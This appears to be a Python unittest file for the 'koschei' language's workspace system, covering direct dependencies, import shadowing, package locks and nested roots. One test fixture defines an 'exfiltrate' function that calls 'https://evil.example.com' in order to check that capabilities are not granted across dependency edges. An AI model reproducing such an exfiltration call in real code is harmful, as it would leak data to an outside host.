from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from koschei.modules import ModuleError, check_graph
from koschei.semantic import SemanticError
from koschei.workspace import WorkspaceError, load_workspace
from koschei.workspace_modules import load_workspace_member_graph
from koschei.workspace_package_lock import (
    build_workspace_package_lock,
    verify_workspace_package_lock,
)


def _project(root: Path, name: str, source: str) -> None:
    (root / "src").mkdir(parents=True)
    (root / "koschei.toml").write_text(
        "[package]\n"
        f'name = "{name}"\n'
        'version = "0.1.0"\n'
        'entry = "src/main.ks"\n\n'
        "[capabilities]\n"
        "disk = []\n"
        "net = []\n"
        "env = []\n"
        "process = false\n",
        encoding="utf-8",
    )
    (root / "src" / "main.ks").write_text(source, encoding="utf-8")


def _workspace_manifest(
    root: Path,
    members: list[str],
    dependencies: dict[str, list[str]],
) -> None:
    lines = [
        'schema_version = "koschei.workspace/v1"',
        "",
        "[workspace]",
        "members = [",
        *(f'  "{member}",' for member in members),
        "]",
        "",
        "[dependencies]",
    ]
    for name in sorted(dependencies):
        deps = ", ".join(f'"{dependency}"' for dependency in dependencies[name])
        lines.append(f"{name} = [{deps}]")
    lines.append("")
    (root / "koschei.workspace.toml").write_text("\n".join(lines), encoding="utf-8")


def _commerce(root: Path) -> None:
    _project(
        root / "libs" / "domain",
        "domain",
        "fn stock_ok(stock: Int) -> Bool { return stock > 0 }\n"
        "fn main() {}\n",
    )
    _project(
        root / "services" / "catalog",
        "catalog",
        "import domain\n"
        "fn sellable(stock: Int) -> Bool { return domain.stock_ok(stock) }\n"
        "fn main() { println(\"catalog:{sellable(2)}\") }\n",
    )
    _project(
        root / "services" / "orders",
        "orders",
        "import catalog\n"
        "fn main() { println(\"orders:{catalog.sellable(2)}\") }\n",
    )
    _workspace_manifest(
        root,
        ["services/orders", "libs/domain", "services/catalog"],
        {"domain": [], "catalog": ["domain"], "orders": ["catalog"]},
    )


class WorkspacePackageImportTests(unittest.TestCase):
    def test_declared_direct_package_chain_checks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _commerce(root)
            workspace = load_workspace(root)

            orders = load_workspace_member_graph(workspace, "orders")
            report = check_graph(orders)

            paths = {module.path for module in orders.modules.values()}
            self.assertIn(root / "services" / "orders" / "src" / "main.ks", paths)
            self.assertIn(root / "services" / "catalog" / "src" / "main.ks", paths)
            self.assertIn(root / "libs" / "domain" / "src" / "main.ks", paths)
            self.assertGreaterEqual(report.functions, 1)

    def test_transitive_package_is_not_implicitly_visible(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _commerce(root)
            orders = root / "services" / "orders" / "src" / "main.ks"
            orders.write_text(
                "import domain\n"
                "fn main() { println(\"{domain.stock_ok(2)}\") }\n",
                encoding="utf-8",
            )
            workspace = load_workspace(root)

            with self.assertRaisesRegex(ModuleError, "doğrudan dependency"):
                load_workspace_member_graph(workspace, "orders")

    def test_local_module_cannot_shadow_declared_package(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _commerce(root)
            shadow = root / "services" / "catalog" / "src" / "domain.ks"
            shadow.write_text("fn stock_ok(stock: Int) -> Bool { return true }\n", encoding="utf-8")
            workspace = load_workspace(root)

            with self.assertRaisesRegex(ModuleError, "Belirsiz import"):
                load_workspace_member_graph(workspace, "catalog")

    def test_dependency_edge_never_supplies_capability_argument(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _project(
                root / "dependency",
                "dependency",
                "fn exfiltrate(net: NetCaps) {\n"
                '    let response = net.get("https://evil.example.com") or ""\n'
                "}\n"
                "fn main() {}\n",
            )
            _project(
                root / "consumer",
                "consumer",
                "import dependency\n"
                "fn main() { dependency.exfiltrate() }\n",
            )
            _workspace_manifest(
                root,
                ["dependency", "consumer"],
                {"dependency": [], "consumer": ["dependency"]},
            )
            workspace = load_workspace(root)
            graph = load_workspace_member_graph(workspace, "consumer")

            with self.assertRaisesRegex(SemanticError, "KS2401"):
                check_graph(graph)

    def test_workspace_package_lock_binds_dependency_source_bytes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _commerce(root)
            workspace = load_workspace(root)
            locked = build_workspace_package_lock(workspace)
            self.assertEqual(locked.build_order, ("domain", "catalog", "orders"))

            domain = root / "libs" / "domain" / "src" / "main.ks"
            domain.write_text(
                "fn stock_ok(stock: Int) -> Bool { return stock >= 0 }\n"
                "fn main() {}\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(WorkspaceError, "domain"):
                verify_workspace_package_lock(load_workspace(root), locked)

    def test_nested_package_roots_are_rejected_for_unique_ownership(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _project(root / "packages" / "parent", "parent", "fn main() {}\n")
            _project(
                root / "packages" / "parent" / "child",
                "child",
                "fn main() {}\n",
            )
            _workspace_manifest(
                root,
                ["packages/parent", "packages/parent/child"],
                {"parent": [], "child": []},
            )
            workspace = load_workspace(root)

            with self.assertRaisesRegex(WorkspaceError, "cannot be nested"):
                load_workspace_member_graph(workspace, "parent")


if __name__ == "__main__":
    unittest.main()
